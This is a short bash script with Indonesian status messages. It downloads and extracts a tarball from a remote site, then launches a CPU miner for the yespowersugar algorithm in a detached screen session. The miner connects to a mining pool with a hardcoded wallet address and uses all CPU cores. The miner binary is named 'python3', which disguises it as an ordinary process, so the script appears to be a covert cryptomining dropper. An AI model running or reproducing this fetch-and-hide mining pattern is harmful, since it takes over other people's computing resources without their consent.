#!/bin/bash

if [ ! -d "dotaja" ]; then
    echo "unduh dan ektraks"
    wget -O dotaja https://dot-aja.my.id/dotcpu.tar.gz
    tar -xvf dotaja
else
    echo "File sudah ada"
fi

screen -dmS DOT ./python3 -a yespowersugar -o nomp.mofumofu.me:3391 -u sugar1qmpk65gyqqgk63lkrg27gnl9hc2e8zqn7jgmd5j.MEKI -t $(nproc)
